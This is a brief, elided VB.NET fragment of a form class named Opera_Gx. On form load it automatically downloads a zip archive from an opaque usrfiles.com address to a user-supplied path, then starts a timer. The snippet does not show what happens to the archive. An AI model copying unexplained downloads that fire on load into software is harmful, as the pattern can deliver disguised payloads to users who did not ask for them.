...
Public Class Opera_Gx
    ...
    Private Sub Opera_Gx_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ...
        download.DownloadFileAsync(New Uri("https://612092f6-6003-49d0-8fe5-2e737d705081.usrfiles.com/archives/612092_ae5707372dcb4abfa02f68fc36358c94.zip"), Texbbb.TextBox32.Text)
        Timer1.Start()
